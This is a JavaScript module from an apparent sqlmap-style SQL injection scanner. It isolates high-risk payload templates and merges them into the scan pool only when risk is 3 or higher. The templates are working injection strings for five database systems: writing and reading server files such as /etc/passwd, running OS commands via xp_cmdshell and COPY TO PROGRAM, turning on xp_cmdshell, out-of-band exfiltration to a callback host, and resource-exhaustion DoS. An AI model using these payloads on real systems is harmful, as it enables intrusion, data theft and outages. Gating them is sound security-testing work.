// ============================================================================
// destructive.js —— 高危（risk 3）payload 隔离池
// ============================================================================
// 背景：此前一批「sqlmap 对标」payload 被直接追加进 payloads/<dbms>.js 的默认数组，
// 其中混入了具备**副作用**的向量：服务端写文件、任意文件读、OS 命令执行、注册表读取、
// 永久修改服务器配置、命名锁阻塞、CPU/内存 DoS，以及**硬编码第三方域名**的外连 OOB。
// 这些向量在 sqlmap 中属于 --risk=3（且多数还需 --level 提升）才会投放的范畴；
// 本项目默认 risk=2、level=1，把它们放进默认池等于任何一次常规扫描都会执行。
//
// 处理原则：
//   1. 默认池（PAYLOADS）只保留无副作用向量 —— 报错回显 / 布尔真假 / 参数化延时；
//   2. 副作用向量集中在本文件，默认**不投放**；
//   3. 需使用时显式调用 enableDestructivePayloads()（对应 --risk=3），调用方须确保已授权。
//
// 已被移出默认池的向量分类：
//   - fileWrite : 服务端写文件（INTO OUTFILE / ATTACH DATABASE）
//   - fileRead  : 任意文件读（LOAD_FILE / pg_read_file / lo_import）
//   - rce       : OS 命令 / 脚本执行（COPY TO PROGRAM / xp_cmdshell / sp_execute_external_script /
//                 Python 脚本 / load_extension）
//   - config    : 修改目标服务器配置（sp_configure 开启 xp_cmdshell）
//   - oob       : 外连第三方（OPENROWSET / xp_dirtree / xp_fileexist / dblink / UTL_HTTP /
//                 UTL_INADDR DNS 外带）—— 外连地址必须走 OOB 的 {CALLBACK} 占位符，
//                 不得硬编码任何真实域名
//   - dos       : 阻塞/资源耗尽（GET_LOCK / 硬编码 BENCHMARK / RLIKE REPEAT / RANDOMBLOB）
// ============================================================================

/**
 * 高危 payload 池：{ DBMS: { technique: [template, ...] } }
 * 仅在 enableDestructivePayloads() 被调用后合并进 PAYLOADS。
 */
export const DESTRUCTIVE_PAYLOADS = {
  MySQL: {
    error: [
      // fileWrite: 服务端写文件（原默认 error 池遗留项，sqlmap 归 risk=3）
      "{ORIG} INTO OUTFILE '/tmp/t'-- -",
    ],
    time: [
      // dos: 命名锁会阻塞其他会话 5 秒，等同业务拒绝服务
      "{ORIG}' AND GET_LOCK('sqli', 5)-- -",
      // dos: 硬编码 500 万次 SHA1，不受 {SLEEP} 配置约束
      "{ORIG}' AND BENCHMARK(5000000, SHA1((SELECT VERSION())))-- -",
      // dos: 5MB 正则回溯
      "{ORIG}' AND '1' RLIKE CONCAT('a', REPEAT('b', 5000000))-- -",
    ],
    stacked: [
      // fileWrite: 服务端写文件
      "{ORIG}'; SELECT 'test' INTO OUTFILE '/tmp/sqli_test.txt'-- -",
      // fileRead: 任意文件读
      "{ORIG}'; SELECT LOAD_FILE('/etc/passwd')-- -",
    ],
  },

  PostgreSQL: {
    time: [
      // rce: COPY ... TO PROGRAM 执行 OS 命令（通常需 superuser）
      "{ORIG}'; COPY (SELECT 1) TO PROGRAM 'sleep 5'-- -",
      // fileRead: 服务端文件读
      "{ORIG}' AND pg_read_file('/etc/passwd') IS NOT NULL-- -",
      // fileWrite: lo_import 会把文件内容写入大对象（写操作）
      "{ORIG}' AND lo_import('/etc/passwd') > 0-- -",
    ],
    stacked: [
      // oob: 外连（应改用 {CALLBACK} 占位符走 OOB 通道）
      "{ORIG}'; SELECT dblink_connect('host={CALLBACK} user=sqli')-- -",
      // fileRead: 目录列举
      "{ORIG}'; SELECT pg_ls_dir('/')-- -",
    ],
  },

  SQLite: {
    time: [
      // dos: 10MB / 50MB 随机 blob，内存与 CPU 尖峰（SQLite 无原生 SLEEP，
      // 用重运算近似延迟 —— 但 50MB 已远超「探测级」开销，且不受 {SLEEP} 配置控制）
      "{ORIG}' AND LIKE('ABCDEFG', HEX(RANDOMBLOB(10000000)))-- -",
      "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))/**/",
    ],
    stacked: [
      // fileWrite: 服务端建库写文件
      "{ORIG}'; ATTACH DATABASE '/tmp/sqli_test.sqlite' AS sqli_db-- -",
      // rce: 加载原生扩展 = 任意代码执行
      "{ORIG}'; SELECT load_extension('/tmp/sqli_ext')-- -",
      "{ORIG}; SELECT load_extension('/tmp/x') {SEP}",
    ],
  },

  'SQL Server': {
    error: [
      // oob: 外连第三方 SQL Server（原实现硬编码 attacker.com）
      "{ORIG}' AND 1=(SELECT COUNT(*) FROM OPENROWSET('SQLOLEDB', 'server={CALLBACK};uid=sqli;pwd=sqli', 'SELECT 1'))-- -",
      // rce: 命令执行（源自默认 error 池的遗留项，源码注释里早已标记为 P0 待办）
      "{ORIG}'; EXEC xp_cmdshell 'whoami'-- -",
      "{ORIG}'; EXEC master..xp_cmdshell 'whoami'-- -",
    ],
    boolean: [
      // oob: UNC 路径外连（原实现硬编码 attacker.com）
      "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}\\\\sqli'-- -",
      "{ORIG}'; EXEC master..xp_fileexist '\\\\{CALLBACK}\\\\test'-- -",
      // rce: Python 外部脚本执行
      "{ORIG}'; EXEC sp_execute_external_script @language=N'Python', @script=N'import time;time.sleep(5)'-- -",
    ],
    stacked: [
      // rce: 命令执行
      "{ORIG}'; EXEC master..xp_cmdshell 'whoami' {SEP}",
      // fileRead: 读注册表
      "{ORIG}'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'-- -",
      // config: 永久开启 xp_cmdshell —— 修改服务器配置且不可自动回滚，危害最高
      "{ORIG}'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -",
    ],
  },

  Oracle: {
    error: [
      // oob: 把 banner 当主机名发起 DNS 解析 → DNS 外带泄漏
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -",
    ],
    time: [
      // oob: HTTP 外连（原实现硬编码 attacker.com）
      "{ORIG}' AND UTL_HTTP.REQUEST('http://{CALLBACK}/oracle_oob')=1-- -",
    ],
  },
};

/** 需要 risk>=3 才允许开启的高危池 */
export const DESTRUCTIVE_MIN_RISK = 3;

/**
 * 把高危 payload 合并进目标 PAYLOADS 结构（原地合并，返回同一对象）。
 *
 * 安全约束：
 *   - risk 必须 >= 3，否则抛错（防止误调用导致默认路径被污染）；
 *   - 合并是追加而非替换，默认池内容不受影响；
 *   - 幂等：重复调用会去重，不会重复追加。
 *
 * @param {object} PAYLOADS 来自 payloads.js 的 PAYLOADS 结构
 * @param {number} risk 当前 risk 等级
 * @returns {object} 合并后的 PAYLOADS（同一引用）
 */
export function enableDestructivePayloads(PAYLOADS, risk) {
  const r = Number(risk) || 0;
  if (r < DESTRUCTIVE_MIN_RISK) {
    throw new Error(
      `拒绝启用高危 payload 池：当前 risk=${r}，需 risk>=${DESTRUCTIVE_MIN_RISK} 且已获得明确授权`
    );
  }
  for (const [dbms, byTech] of Object.entries(DESTRUCTIVE_PAYLOADS)) {
    if (!PAYLOADS[dbms]) continue;
    for (const [tech, list] of Object.entries(byTech)) {
      if (!Array.isArray(PAYLOADS[dbms][tech])) PAYLOADS[dbms][tech] = [];
      const target = PAYLOADS[dbms][tech];
      for (const tpl of list) {
        if (!target.includes(tpl)) target.push(tpl); // 幂等
      }
    }
  }
  return PAYLOADS;
}

/** 读取某库某技术的高危模板（只读，供能力清单/审计展示） */
export function getDestructiveTemplates(dbms, technique) {
  const byTech = DESTRUCTIVE_PAYLOADS[dbms];
  if (!byTech) return [];
  return technique ? byTech[technique] || [] : Object.values(byTech).flat();
}

export default DESTRUCTIVE_PAYLOADS;
